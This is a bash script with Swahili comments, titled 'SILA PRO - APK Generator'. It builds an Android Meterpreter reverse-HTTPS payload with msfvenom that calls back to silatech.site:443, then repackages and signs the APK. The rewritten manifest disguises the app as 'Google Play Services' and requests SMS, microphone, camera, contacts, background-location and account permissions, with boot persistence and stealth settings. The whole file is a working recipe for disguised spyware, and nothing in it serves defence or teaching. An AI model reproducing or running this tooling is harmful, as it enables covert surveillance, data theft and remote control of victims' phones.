#!/bin/bash
# ============================================
# SILA PRO - APK Generator
# Domain: silatech.site
# ============================================

set -e  # Inaacha script ikiwa kuna error

# Unda folder za matokeo
mkdir -p output
rm -rf output/decompiled

# Soma domain na port kutoka environment (au tumia default)
LHOST=${LHOST:-"silatech.site"}
LPORT=${LPORT:-"443"}

echo "[+] SILA PRO: Generating APK for $LHOST:$LPORT"

# ------------------------------------------------------------------
# HATUA 1: Tengeneza payload ghafi (msfvenom)
# ------------------------------------------------------------------
PAYLOAD_FILE="output/sila_raw.apk"

if command -v msfvenom &> /dev/null; then
    echo "[+] Using local msfvenom"
    msfvenom -p android/meterpreter/reverse_https \
             LHOST=$LHOST LPORT=$LPORT \
             --platform android -a dalvik \
             -o $PAYLOAD_FILE
elif command -v docker &> /dev/null; then
    echo "[+] msfvenom not found, using Docker"
    docker run --rm \
        -v $(pwd)/output:/output \
        metasploitframework/metasploit-framework:latest \
        msfvenom -p android/meterpreter/reverse_https \
        LHOST=$LHOST LPORT=$LPORT \
        --platform android -a dalvik \
        -o /output/sila_raw.apk
else
    echo "[!] ERROR: Neither msfvenom nor Docker found. Install one."
    exit 1
fi

# Hakikisha payload imeundwa
if [ ! -f $PAYLOAD_FILE ]; then
    echo "[!] Failed to generate payload."
    exit 1
fi
echo "[✓] Payload created: $PAYLOAD_FILE"

# ------------------------------------------------------------------
# HATUA 2: Decompile kwa apktool
# ------------------------------------------------------------------
if ! command -v apktool &> /dev/null; then
    echo "[!] apktool not found. Installing..."
    wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
    chmod +x /usr/local/bin/apktool
    wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
fi

echo "[+] Decompiling with apktool..."
apktool d $PAYLOAD_FILE -o output/decompiled -f

# ------------------------------------------------------------------
# HATUA 3: Badilisha AndroidManifest.xml (permissions + stealth)
# ------------------------------------------------------------------
cat > output/decompiled/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.google.android.gms.update"
    android:installLocation="internalOnly"
    android:versionCode="20250301"
    android:versionName="25.03.01">

    <!-- Permissions zote -->
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>

    <application
        android:label="Google Play Services"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="true"
        android:persistent="true"
        android:theme="@android:style/Theme.Translucent.NoTitleBar">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <service android:name=".MainService" android:exported="false" android:foregroundServiceType="dataSync"/>
    </application>
</manifest>
EOF

echo "[✓] Manifest injected with full permissions"

# ------------------------------------------------------------------
# HATUA 4: Rebuild APK
# ------------------------------------------------------------------
echo "[+] Rebuilding APK..."
apktool b output/decompiled -o output/sila_repacked.apk

# ------------------------------------------------------------------
# HATUA 5: Sign APK
# ------------------------------------------------------------------
if ! command -v keytool &> /dev/null || ! command -v apksigner &> /dev/null; then
    echo "[!] Installing Java and apksigner..."
    apt-get update -qq && apt-get install -y -qq openjdk-17-jdk apksigner 2>/dev/null || true
fi

# Tengeneza keystore (ikiwa haipo)
if [ ! -f output/sila.keystore ]; then
    keytool -genkey -v -keystore output/sila.keystore \
            -alias sila -keyalg RSA -keysize 2048 -validity 10000 \
            -storepass sila123 -keypass sila123 \
            -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
fi

echo "[+] Signing APK..."
apksigner sign --ks output/sila.keystore \
               --ks-pass pass:sila123 \
               --out output/sila_final.apk \
               output/sila_repacked.apk

# Thibitisha sahihi
apksigner verify output/sila_final.apk

# ------------------------------------------------------------------
# HATUA 6: Safisha na kuonyesha matokeo
# ------------------------------------------------------------------
rm -f output/sila_raw.apk output/sila_repacked.apk
rm -rf output/decompiled

echo "============================================"
echo "[✔] SUCCESS! APK iko tayari:"
echo "    output/sila_final.apk"
echo "    Domain: $LHOST:$LPORT"
echo "    Size: $(du -h output/sila_final.apk | cut -f1)"
echo "============================================"
